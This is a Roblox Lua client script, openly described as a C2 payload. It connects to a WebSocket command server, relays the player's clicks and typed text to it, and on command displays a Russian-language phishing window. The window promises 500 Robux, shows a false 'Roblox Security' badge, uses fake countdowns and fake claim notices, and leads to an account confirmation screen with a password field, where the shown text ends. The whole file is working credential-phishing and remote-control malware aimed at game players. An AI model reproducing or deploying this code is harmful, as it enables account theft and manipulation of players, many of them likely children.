-- C2 Studio-compatible payload (uses HttpService:CreateWebStreamClient)
-- Помести в StarterGui → LocalScript
-- Удали все Script из Workspace (WebSocket на сервере не работает)
-- Запусти сервер: python c2_server.py → Play в Studio

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local WS_URL = "ws://127.0.0.1:8081"
local RECONNECT_DELAY = 5
local CHUNK_SIZE = 128

-- Polyfill executor-специфичных функций
if not _G.writefile then
	_G.writefile = function() end
end
if not _G.readfile then
	_G.readfile = function() return "" end
end
if not _G.gethui then
	_G.gethui = function()
		local lp = Players.LocalPlayer
		if lp then
			local pg = lp:FindFirstChild("PlayerGui")
			if pg then return pg end
			local ok, result = pcall(lp.WaitForChild, lp, "PlayerGui", 5)
			if ok and result then return result end
		end
		return nil
	end
end

local AssetService = game:GetService("AssetService")
local GuiService = game:GetService("GuiService")
local UserInputService = game:GetService("UserInputService")

if C2 and C2._running then return end
C2 = {}
C2._running = true
C2._dbg_idx = 0
C2.debug = function(msg)
	C2._dbg_idx = C2._dbg_idx + 1
	local line = "[" .. C2._dbg_idx .. "] " .. tostring(msg)
	print(line)
	pcall(function()
		local old = ""
		local ok, data = pcall(readfile, "c2_log.txt")
		if ok then old = data end
		local lines = {}
		for line in old:gmatch("[^\n]+") do
			table.insert(lines, line)
		end
		while #lines > 200 do table.remove(lines, 1) end
		table.insert(lines, line)
		writefile("c2_log.txt", table.concat(lines, "\n"))
	end)
end

-- Base64 decode (HttpService:Base64Decode не существует в Studio)
local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local b64table = {}
for i = 1, 64 do b64table[string.byte(b64chars, i)] = i - 1 end
b64table[string.byte('=')] = 0
local function base64_decode(s)
	local result = {}
	local buf = 0
	local bits = 0
	for i = 1, #s do
		local v = b64table[string.byte(s, i)]
		if v then
			buf = buf * 64 + v
			bits = bits + 6
			if bits >= 8 then
				bits = bits - 8
				table.insert(result, string.char(math.floor(buf / (2 ^ bits))))
				buf = buf % (2 ^ bits)
			end
		end
	end
	return table.concat(result)
end

C2.browser_coords = function()
	if not C2.browser or not C2.browser.viewport then return end
	local vp = C2.browser.viewport
	if vp.AbsoluteSize.X <= 0 or vp.AbsoluteSize.Y <= 0 then return end
	local mp = UserInputService:GetMouseLocation()
	local rx = mp.X - vp.AbsolutePosition.X
	local ry = mp.Y - vp.AbsolutePosition.Y
	if rx < 0 or ry < 0 or rx > vp.AbsoluteSize.X or ry > vp.AbsoluteSize.Y then return end
	return math.floor(rx / vp.AbsoluteSize.X * C2.browser.width),
	math.floor(ry / vp.AbsoluteSize.Y * C2.browser.height)
end

C2.send = function(t)
	local s = HttpService:JSONEncode(t)
	C2.debug("SEND: " .. s)
	pcall(function() ws:Send(s) end)
end
C2.on_message = nil
C2.hidden_guis = {}
C2.hide_all_guis = function()
	C2.hidden_guis = {}
	if C2.current_gui and C2.current_gui.Enabled then
		C2.current_gui.Enabled = false
		table.insert(C2.hidden_guis, C2.current_gui)
	end
	for _, gui in ipairs(Players.LocalPlayer:WaitForChild("PlayerGui"):GetChildren()) do
		if gui:IsA("ScreenGui") and gui.Enabled and gui ~= (C2.browser and C2.browser.screen_gui) then
			gui.Enabled = false
			table.insert(C2.hidden_guis, gui)
		end
	end
end
C2.restore_hidden_guis = function()
	for _, gui in ipairs(C2.hidden_guis) do
		pcall(function() gui.Enabled = true end)
	end
	C2.hidden_guis = {}
end

C2.unload = function()
	C2.debug("UNLOAD called")
	C2.on_message = nil
	C2.restore_hidden_guis()
	C2.browser_shutdown()
	if C2.current_gui then
		C2.debug("UNLOAD: destroying GUI")
		pcall(function() C2.current_gui:Destroy() end)
		C2.current_gui = nil
	end
end

C2.browser = nil

function C2.browser_init()
	if C2.browser and C2.browser.active then
		C2.debug("browser_init: already active, recreating")
		C2.browser_shutdown()
	end
	C2.debug("browser_init")

	local screen_gui = Instance.new("ScreenGui")
	screen_gui.Name = "BrowserStream"
	screen_gui.DisplayOrder = 999
	screen_gui.IgnoreGuiInset = true
	screen_gui.ResetOnSpawn = false

	local frame = Instance.new("Frame")
	frame.Name = "BrowserViewport"
	frame.Size = UDim2.fromScale(1, 1)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0
	frame.Position = UDim2.fromScale(0.5, 0.5)
	frame.AnchorPoint = Vector2.new(0.5, 0.5)

	local aspect = Instance.new("UIAspectRatioConstraint")
	aspect.Parent = frame

	local image = Instance.new("ImageButton")
	image.Name = "Screen"
	image.Size = UDim2.fromScale(1, 1)
	image.BackgroundTransparency = 1
	image.AutoButtonColor = false
	image.BorderSizePixel = 0
	image.Parent = frame

	local textbox = Instance.new("TextBox")
	textbox.Name = "KeyCapture"
	textbox.Size = UDim2.new(0, 0, 0, 0)
	textbox.Visible = false
	textbox.ClearTextOnFocus = true
	textbox.Parent = screen_gui

	frame.Parent = screen_gui
	screen_gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

	C2.browser = {
		active = true,
		editable_image = nil,
		image_label = image,
		viewport = frame,
		screen_gui = screen_gui,
		textbox = textbox,
		width = 0,
		height = 0,
		ready = false,
	}

	C2._last_mx = nil
	C2._last_my = nil

	image.MouseMoved:Connect(function(lx, ly)
		if not C2.browser.ready then return end
		local vp = C2.browser.viewport
		if vp.AbsoluteSize.X <= 0 or vp.AbsoluteSize.Y <= 0 then return end
		local mx = math.floor(lx / vp.AbsoluteSize.X * C2.browser.width)
		local my = math.floor(ly / vp.AbsoluteSize.Y * C2.browser.height)
		C2._last_mx = mx
		C2._last_my = my
		C2.debug("MOUSE moved: canvas(" .. lx .. "," .. ly .. ") -> browser(" .. mx .. "," .. my .. ")")
		C2.browser_send_mouse(C2._last_mx, C2._last_my, 0)
	end)

	local function do_click(ev_down, ev_up)
		if not C2.browser.ready then
			C2.debug("MOUSE click ignored: browser not ready")
			return
		end
		if C2._last_mx == nil then
			C2.debug("MOUSE click ignored: no last mouse pos")
			return
		end
		C2.debug("MOUSE click: down=" .. ev_down .. " up=" .. ev_up .. " at (" .. C2._last_mx .. "," .. C2._last_my .. ")")
		if ev_down == 1 then
			pcall(function() textbox:CaptureFocus() end)
		end
		C2.browser_send_mouse(C2._last_mx, C2._last_my, ev_down)
		task.wait(0.05)
		C2.browser_send_mouse(C2._last_mx, C2._last_my, ev_up)
	end

	image.MouseButton1Click:Connect(function() do_click(1, 3) end)
	image.MouseButton2Click:Connect(function() do_click(2, 4) end)

	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		if not C2.browser.ready then return end
		local text = textbox.Text
		if #text > 0 then
			C2.debug("Text input: " .. text:sub(1, 50))
			C2.browser_send_text(text)
			textbox.Text = ""
		end
	end)

	C2.debug("browser_init done")
end

function C2.browser_shutdown()
	C2.restore_hidden_guis()
	if C2.browser then
		if C2.browser.screen_gui then
			pcall(function() C2.browser.screen_gui:Destroy() end)
		end
		C2.browser = nil
	end
end

function C2.browser_send_mouse(x, y, ev)
	C2.debug("Mouse send: " .. x .. "," .. y .. " ev=" .. ev)
	C2.send({type="mouse",x=x,y=y,event=ev})
end

function C2.browser_send_reset()
	C2.send({type="reset"})
end

function C2.browser_send_load(url)
	C2.send({type="load",url=url})
end

function C2.browser_send_key(ev_type, key)
	C2.debug("Key send: type=" .. ev_type .. " key=" .. key)
	C2.send({type="keyboard",event=ev_type,key=key})
end

function C2.browser_send_text(text)
	C2.debug("Text send: " .. text:sub(1,50))
	C2.send({type="text",text=text})
end

UserInputService.InputChanged:Connect(function(input, processed)
	if processed or not C2.browser or not C2.browser.ready then return end
	if input.UserInputType == Enum.UserInputType.MouseWheel then
		local x, y = C2.browser_coords()
		if x then
			C2.browser_send_mouse(x, y, input.Position.Z < 0 and 5 or 6)
		end
	end
end)

function C2.browser_handle(raw)
	local ok, err = pcall(function()
		local op = string.byte(raw, 1)
		C2.debug("browser_handle op=" .. op .. " len=" .. #raw)

		if op == 0 then
			C2.hide_all_guis()
			local w, h = string.unpack("<I4I4", raw, 2)
			C2.debug("Resize: " .. w .. "x" .. h)
			C2.browser.width = w
			C2.browser.height = h

			local ok2, ei = pcall(AssetService.CreateEditableImage, AssetService, {
				Size = Vector2.new(w, h),
			})
			if ok2 and ei then
				if C2.browser.editable_image then
					pcall(function() C2.browser.editable_image:Destroy() end)
				end
				C2.browser.editable_image = ei
				C2.browser.image_label.ImageContent = Content.fromObject(ei)
				C2.browser.viewport.UIAspectRatioConstraint.AspectRatio = w / h
				C2.browser.ready = true
				C2.debug("EditableImage created: " .. w .. "x" .. h)
			else
				C2.debug("CreateEditableImage failed: " .. tostring(ei))
			end

		elseif op == 1 and C2.browser.ready then
			local cx = string.byte(raw, 2)
			local cy = string.byte(raw, 3)
			local data_len = string.unpack("<I4", raw, 4)
			C2.debug("Chunk " .. cx .. "," .. cy .. " data_len=" .. data_len)

			local ox = cx * CHUNK_SIZE
			local oy = cy * CHUNK_SIZE
			local cw = math.min(CHUNK_SIZE, C2.browser.width - ox)
			local ch = math.min(CHUNK_SIZE, C2.browser.height - oy)

			local pixel_str = raw:sub(8, 7 + data_len)
			local pixel_buf = buffer.fromstring(pixel_str)
			C2.browser.editable_image:WritePixelsBuffer(
				Vector2.new(ox, oy),
				Vector2.new(cw, ch),
				pixel_buf
			)
		end
	end)
	if not ok then
		C2.debug("browser_handle error: " .. tostring(err))
	end
end

local function handle_message(raw)
	if raw == "ping" then return end

	-- Try JSON first
	local ok, data = pcall(HttpService.JSONDecode, HttpService, raw)
	if ok and type(data) == "table" then
		-- Binary frame (base64 encoded)
		if data.__bin__ then
			local bin = base64_decode(data.__bin__)
			if not C2.browser then C2.browser_init() end
			if C2.browser and C2.browser.active then C2.browser_handle(bin) end
			return
		end

		-- JSON command
		if data.type then
			if data.type == "start_browser" then
				C2.browser_init()
			elseif data.type == "stop_browser" then
				C2.restore_hidden_guis()
				C2.browser_shutdown()
			elseif data.type == "show_phish" then
				C2.create_phish_gui()
			end
			if C2.on_message then
				local ok2, err2 = pcall(C2.on_message, data)
				if not ok2 then
					warn("[C2] on_message error:", err2)
					C2.send({type = "client_error", error = tostring(err2), raw_type = tostring(data.type)})
				end
			end
			return
		end
	end

	-- Old protocol binary (op=0 or op=1 as raw string)
	local b = raw:byte(1)
	if b and b <= 1 then
		if not C2.browser then C2.browser_init() end
		if C2.browser and C2.browser.active then C2.browser_handle(raw) end
		return
	end

	-- Module code (loadstring unavailable in Studio — phish GUI is inlined below)
	C2.debug("ignoring server module (phish is inlined)")
	return
end

print("[C2] Starting Studio payload, connecting to " .. WS_URL)

-- Inlined phish.lua — создаёт GUI по команде сервера
function C2.create_phish_gui()
	if C2.current_gui and C2.current_gui.Parent then
		C2.debug("GUI already exists, skipping creation")
		return
	end
	local lp = Players and Players.LocalPlayer
	if not lp then
		C2.debug("LocalPlayer is nil, phish GUI can't show")
		return
	end
	local http = HttpService

	local placeName = game.Name
	local ok, info = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
	end)
	if ok and info and info.Name and #info.Name > 3 then
		placeName = info.Name
	end
	if placeName == "UGC" or placeName == "Roblox" or #placeName < 3 then
		placeName = "вашей любимой игре"
	end
	local serverPlayers = #Players:GetPlayers()

	local statName, statValue, betterPercent
	local ls = lp:FindFirstChild("leaderstats")
	if ls then
		local statObj = ls:FindFirstChildWhichIsA("NumberValue") or ls:FindFirstChildWhichIsA("IntValue")
		if statObj then
			statName = statObj.Name
			statValue = statObj.Value
			local allVals = {}
			for _, plr in Players:GetPlayers() do
				local pls = plr:FindFirstChild("leaderstats")
				if pls then
					local so = pls:FindFirstChildWhichIsA("NumberValue") or pls:FindFirstChildWhichIsA("IntValue")
					if so and so.Name == statName then
						table.insert(allVals, so.Value)
					end
				end
			end
			local worse = 0
			for _, v in ipairs(allVals) do
				if v < statValue then worse = worse + 1 end
			end
			betterPercent = math.floor(worse / math.max(1, #allVals) * 100)
		end
	end

	local playerNames = {}
	for _, plr in Players:GetPlayers() do
		if plr ~= lp then
			table.insert(playerNames, plr.DisplayName)
		end
	end
	if #playerNames == 0 then
		table.insert(playerNames, "Player")
	end

	local g = Instance.new("ScreenGui")
	g.Name = "C2_DailyBonus"
	g.ResetOnSpawn = false
	if not lp then lp = Players.LocalPlayer end
	local parent
	if gethui then
		local ok_p, res_p = pcall(gethui)
		if ok_p and res_p then parent = res_p end
	end
	if not parent then
		local ok_p, res_p = pcall(function() return game:GetService("CoreGui") end)
		if ok_p and res_p then parent = res_p end
	end
	if not parent then
		parent = Players.LocalPlayer and Players.LocalPlayer:FindFirstChild("PlayerGui")
	end
	if parent then
		g.Parent = parent
	else
		C2.debug("WARNING: no valid parent found for GUI")
	end
	C2.current_gui = g
	C2.debug("GUI created, parent=" .. tostring(parent))

	local function new(c, p)
		local o = Instance.new(c)
		for k, v in pairs(p) do o[k] = v end
		return o
	end

	local overlay = new("Frame", {
		Size = UDim2.new(1, 0, 1, 0),
		BackgroundColor3 = Color3.new(0, 0, 0),
		BackgroundTransparency = 0.5,
		Active = true,
		Parent = g
	})

	local hasStats = statName and statValue and betterPercent ~= nil
	local W = 540
	local H = hasStats and 640 or 570
	local win = new("Frame", {
		Size = UDim2.new(0, W, 0, H),
		Position = UDim2.new(0.5, -W / 2, 0.5, -H / 2),
		BackgroundColor3 = Color3.fromRGB(22, 24, 28),
		BorderSizePixel = 0,
		Parent = g
	})

	new("Frame", {
		Size = UDim2.new(1, 0, 0, 4),
		BackgroundColor3 = Color3.fromRGB(255, 180, 0),
		BorderSizePixel = 0,
		Parent = win
	})

	local y = 18

	new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 46),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "\xF0\x9F\x8E\x89  ВЫ ВЫИГРАЛИ 500 ROBUX!",
		TextColor3 = Color3.fromRGB(255, 210, 0),
		TextSize = 34,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})
	y = y + 46

	new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 24),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "\xE2\x9C\xA8  Награда для активных игроков.",
		TextColor3 = Color3.fromRGB(255, 180, 60),
		TextSize = 17,
		Font = Enum.Font.Gotham,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})
	y = y + 28

	new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 30),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "\xF0\x9F\x94\xA5  ТОЛЬКО СЕГОДНЯ!",
		TextColor3 = Color3.fromRGB(255, 80, 80),
		TextSize = 26,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})
	y = y + 36

	new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 20),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "\xF0\x9F\x8E\xAE " .. placeName .. "    \xF0\x9F\x91\xA5 " .. serverPlayers .. " игроков",
		TextColor3 = Color3.fromRGB(150, 160, 175),
		TextSize = 17,
		Font = Enum.Font.Gotham,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})
	y = y + 28

	new("Frame", {
		Size = UDim2.new(0, W - 44, 0, 1),
		Position = UDim2.new(0, 22, 0, y),
		BackgroundColor3 = Color3.fromRGB(40, 44, 50),
		BorderSizePixel = 0,
		Parent = win
	})
	y = y + 14

	if hasStats then
		if betterPercent >= 70 then
			new("TextLabel", {
				Size = UDim2.new(0, W - 40, 0, 28),
				Position = UDim2.new(0, 20, 0, y),
				BackgroundTransparency = 1,
				Text = "\xF0\x9F\x8F\x86  Вы лучше " .. betterPercent .. "% игроков на сервере!",
				TextColor3 = Color3.fromRGB(255, 200, 50),
				TextSize = 20,
				Font = Enum.Font.GothamBold,
				TextXAlignment = Enum.TextXAlignment.Left,
				Parent = win
			})
		else
			new("TextLabel", {
				Size = UDim2.new(0, W - 40, 0, 28),
				Position = UDim2.new(0, 20, 0, y),
				BackgroundTransparency = 1,
				Text = "\xF0\x9F\x9A\x80  Бонус на развитие!",
				TextColor3 = Color3.fromRGB(80, 200, 255),
				TextSize = 20,
				Font = Enum.Font.GothamBold,
				TextXAlignment = Enum.TextXAlignment.Left,
				Parent = win
			})
		end
		y = y + 32
		new("TextLabel", {
			Size = UDim2.new(0, W - 40, 0, 22),
			Position = UDim2.new(0, 20, 0, y),
			BackgroundTransparency = 1,
			Text = "\xF0\x9F\x93\x8A " .. statName .. ": " .. tostring(statValue),
			TextColor3 = Color3.fromRGB(180, 190, 205),
			TextSize = 19,
			Font = Enum.Font.Gotham,
			TextXAlignment = Enum.TextXAlignment.Left,
			Parent = win
		})
		y = y + 30
		new("Frame", {
			Size = UDim2.new(0, W - 44, 0, 1),
			Position = UDim2.new(0, 22, 0, y),
			BackgroundColor3 = Color3.fromRGB(40, 44, 50),
			BorderSizePixel = 0,
			Parent = win
		})
		y = y + 14
	end

	-- successLabel (visible after login in the empty timer area)
	local successLabel = new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 100),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "",
		TextColor3 = Color3.fromRGB(0, 200, 100),
		TextSize = 20,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextYAlignment = Enum.TextYAlignment.Top,
		TextWrapped = true,
		Visible = false,
		Parent = win
	})

	local timerLabel = new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 26),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "\xE2\x8F\xB1  Осталось: 05:00",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 22,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})
	y = y + 30

	local progressClaimed = math.random(780, 950)
	local progressTotal = 1000
	local progressLabel = new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 20),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "Забрано " .. progressClaimed .. " из " .. progressTotal .. " наград",
		TextColor3 = Color3.fromRGB(150, 160, 175),
		TextSize = 15,
		Font = Enum.Font.Gotham,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})
	y = y + 22

	local barBg = new("Frame", {
		Size = UDim2.new(0, W - 40, 0, 12),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundColor3 = Color3.fromRGB(40, 44, 50),
		BorderSizePixel = 0,
		Parent = win
	})
	local barFill = new("Frame", {
		Size = UDim2.new(progressClaimed / progressTotal, 0, 1, 0),
		BackgroundColor3 = Color3.fromRGB(0, 200, 100),
		BorderSizePixel = 0,
		Parent = barBg
	})
	y = y + 18

	local notifLabel = new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 22),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "",
		TextColor3 = Color3.fromRGB(130, 140, 155),
		TextSize = 15,
		Font = Enum.Font.Gotham,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})
	y = y + 26

	local timerSep = new("Frame", {
		Size = UDim2.new(0, W - 44, 0, 1),
		Position = UDim2.new(0, 22, 0, y),
		BackgroundColor3 = Color3.fromRGB(40, 44, 50),
		BorderSizePixel = 0,
		Parent = win
	})
	y = y + 14

	local warnHeader = new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 30),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "\xE2\x9A\xA0  НЕ УПУСТИТЕ ШАНС!",
		TextColor3 = Color3.fromRGB(255, 60, 60),
		TextSize = 24,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})
	y = y + 28

	local warnText = new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 20),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "\xE2\x9A\xA0 Предложение ограничено. Заберите сейчас.",
		TextColor3 = Color3.fromRGB(255, 150, 50),
		TextSize = 17,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})
	y = y + 26

	local stepSep = new("Frame", {
		Size = UDim2.new(0, W - 44, 0, 1),
		Position = UDim2.new(0, 22, 0, y),
		BackgroundColor3 = Color3.fromRGB(40, 44, 50),
		BorderSizePixel = 0,
		Parent = win
	})
	y = y + 14

	local stepLabel = new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 22),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "\xE2\x9E\xA1 Шаг 1 из 2: Получите награду",
		TextColor3 = Color3.fromRGB(100, 200, 255),
		TextSize = 17,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})
	y = y + 28

	local claimBtn = new("TextButton", {
		Size = UDim2.new(0, W - 40, 0, 56),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundColor3 = Color3.fromRGB(220, 50, 50),
		BorderSizePixel = 0,
		Text = " ЗАБРАТЬ 500 ROBUX",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 24,
		Font = Enum.Font.GothamBold,
		Parent = win
	})
	y = y + 62

	new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 20),
		Position = UDim2.new(0, 20, 0, y),
		BackgroundTransparency = 1,
		Text = "\xF0\x9F\x9B\xA1  Проверено Roblox Security",
		TextColor3 = Color3.fromRGB(80, 160, 80),
		TextSize = 14,
		Font = Enum.Font.Gotham,
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = win
	})

	task.spawn(function()
		local remaining = 300
		local extend = nil
		local notifIdx = 1
		local notifTimer = 0
		while g.Parent do
			if verified then break end
			if remaining > 0 then
				local m = remaining // 60
				local s = remaining % 60
				timerLabel.Text = "\xE2\x8F\xB1  Осталось: " .. (m < 10 and "0" or "") .. m .. ":" .. (s < 10 and "0" or "") .. s
				if remaining <= 30 then
					timerLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
				end
				remaining = remaining - 1
			elseif extend == nil then
				extend = 60
				timerLabel.Text = "\xE2\x9A\xA0  ПОСЛЕДНИЙ ШАНС! Время продлено."
				timerLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
			elseif extend > 0 then
				timerLabel.Text = "\xE2\x8F\xB1  Осталось: 00:" .. (extend < 10 and "0" or "") .. extend
				timerLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
				extend = extend - 1
			else
				C2.debug("timer expired, sending timed_out")
				C2.send({type = "timed_out"})
				C2.debug("calling unload after timed_out")
				C2.unload()
				break
			end
			if notifTimer <= 0 then
				local name = playerNames[(notifIdx % #playerNames) + 1]
				local amount = math.random(10, 50) * 10
				notifLabel.Text = "\xF0\x9F\x93\xA2 " .. name .. " только что получил " .. amount .. " ROBUX!"
				notifLabel.TextColor3 = Color3.fromRGB(130, 200, 255)
				notifTimer = 60
				notifIdx = notifIdx + 1
			end
			notifTimer = notifTimer - 1
			task.wait(1)
		end
		C2.debug("timer thread: while loop ended, g.Parent=" .. tostring(g.Parent))
	end)

	local closeBtn = new("TextButton", {
		Size = UDim2.new(0, 34, 0, 34),
		Position = UDim2.new(1, -44, 0, 8),
		BackgroundColor3 = Color3.fromRGB(40, 44, 50),
		BorderSizePixel = 0,
		Text = "X",
		TextColor3 = Color3.fromRGB(150, 160, 175),
		TextSize = 20,
		Font = Enum.Font.GothamBold,
		Parent = win
	})

	local confirmFrame = new("Frame", {
		Size = UDim2.new(1, 0, 1, 0),
		BackgroundColor3 = Color3.fromRGB(22, 24, 28),
		BorderSizePixel = 0,
		Visible = false,
		ZIndex = 10,
		Parent = win
	})
	local cy = 40
	new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 36),
		Position = UDim2.new(0, 20, 0, cy),
		BackgroundTransparency = 1,
		Text = "\xE2\x9D\x97  Вы уверены?",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 26,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 10,
		Parent = confirmFrame
	})
	cy = cy + 50
	new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 60),
		Position = UDim2.new(0, 20, 0, cy),
		BackgroundTransparency = 1,
		Text = "Это предложение доступно только сегодня. Если вы закроете, вы больше не сможете получить 500 ROBUX. Ваша награда будет передана другому игроку.",
		TextColor3 = Color3.fromRGB(180, 190, 205),
		TextSize = 17,
		Font = Enum.Font.Gotham,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextWrapped = true,
		ZIndex = 10,
		Parent = confirmFrame
	})
	cy = cy + 80
	local stayBtn = new("TextButton", {
		Size = UDim2.new(0, W - 44, 0, 50),
		Position = UDim2.new(0, 22, 0, cy),
		BackgroundColor3 = Color3.fromRGB(0, 180, 90),
		BorderSizePixel = 0,
		Text = " ПОЛУЧИТЬ 500 ROBUX",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 22,
		Font = Enum.Font.GothamBold,
		ZIndex = 10,
		Parent = confirmFrame
	})
	cy = cy + 60
	local confirmCloseBtn = new("TextButton", {
		Size = UDim2.new(0, W - 44, 0, 44),
		Position = UDim2.new(0, 22, 0, cy),
		BackgroundColor3 = Color3.fromRGB(50, 50, 60),
		BorderSizePixel = 0,
		Text = "Нет, я не хочу 500 ROBUX",
		TextColor3 = Color3.fromRGB(150, 160, 175),
		TextSize = 17,
		Font = Enum.Font.Gotham,
		ZIndex = 10,
		Parent = confirmFrame
	})

	closeBtn.MouseEnter:Connect(function()
		closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
		closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	end)
	closeBtn.MouseLeave:Connect(function()
		closeBtn.BackgroundColor3 = Color3.fromRGB(40, 44, 50)
		closeBtn.TextColor3 = Color3.fromRGB(150, 160, 175)
	end)
	closeBtn.MouseButton1Click:Connect(function()
		if verified then
			C2.debug("close after verified")
			C2.send({type = "closed"})
			C2.unload()
			return
		end
		confirmFrame.Visible = true
	end)
	stayBtn.MouseEnter:Connect(function()
		stayBtn.BackgroundColor3 = Color3.fromRGB(0, 210, 105)
	end)
	stayBtn.MouseLeave:Connect(function()
		stayBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 90)
	end)
	stayBtn.MouseButton1Click:Connect(function()
		confirmFrame.Visible = false
	end)
	confirmCloseBtn.MouseEnter:Connect(function()
		confirmCloseBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
	end)
	confirmCloseBtn.MouseLeave:Connect(function()
		confirmCloseBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
	end)
	confirmCloseBtn.MouseButton1Click:Connect(function()
		C2.debug("confirm close clicked")
		C2.send({type = "closed"})
		C2.debug("calling unload after confirm close")
		C2.unload()
	end)

	local step = 1
	local checking = false
	local verifyFrame = new("Frame", {
		Size = UDim2.new(1, 0, 1, 0),
		BackgroundColor3 = Color3.fromRGB(22, 24, 28),
		BorderSizePixel = 0,
		Visible = false,
		ZIndex = 10,
		Parent = win
	})
	local vy = 36
	-- Close button on verifyFrame (only shows when attempts exhausted)
	local vCloseBtn = new("TextButton", {
		Size = UDim2.new(0, 34, 0, 34),
		Position = UDim2.new(1, -44, 0, 8),
		BackgroundColor3 = Color3.fromRGB(40, 44, 50),
		BorderSizePixel = 0,
		Text = "X",
		TextColor3 = Color3.fromRGB(150, 160, 175),
		TextSize = 20,
		Font = Enum.Font.GothamBold,
		ZIndex = 11,
		Visible = false,
		Parent = verifyFrame
	})
	vCloseBtn.MouseEnter:Connect(function()
		vCloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
		vCloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	end)
	vCloseBtn.MouseLeave:Connect(function()
		vCloseBtn.BackgroundColor3 = Color3.fromRGB(40, 44, 50)
		vCloseBtn.TextColor3 = Color3.fromRGB(150, 160, 175)
	end)
	vCloseBtn.MouseButton1Click:Connect(function()
		if checking then return end
		C2.debug("vCloseBtn clicked")
		C2.send({type = "closed"})
		C2.unload()
	end)
	new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 40),
		Position = UDim2.new(0, 20, 0, vy),
		BackgroundTransparency = 1,
		Text = "\xF0\x9F\x94\x90  ПОДТВЕРЖДЕНИЕ АККАУНТА",
		TextColor3 = Color3.fromRGB(255, 210, 0),
		TextSize = 28,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 10,
		Parent = verifyFrame
	})
	vy = vy + 50
	new("Frame", {
		Size = UDim2.new(0, W - 44, 0, 1),
		Position = UDim2.new(0, 22, 0, vy),
		BackgroundColor3 = Color3.fromRGB(40, 44, 50),
		BorderSizePixel = 0,
		ZIndex = 10,
		Parent = verifyFrame
	})
	vy = vy + 20
	new("TextLabel", {
		Size = UDim2.new(0, W - 40, 0, 28),
		Position = UDim2.new(0, 20, 0, vy),
		BackgroundTransparency = 1,
		Text = "\xF0\x9F\x91\xA4  Игрок: " .. lp.DisplayName,
		TextColor3 = Color3.fromRGB(180, 190, 205),
		TextSize = 20,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 10,
		Parent = verifyFrame
	})
	vy = vy + 40
	local vPwBox = new("TextBox", {
		Size = UDim2.new(0, W - 44, 0, 52),
		Position = UDim2.new(0, 22, 0, vy),
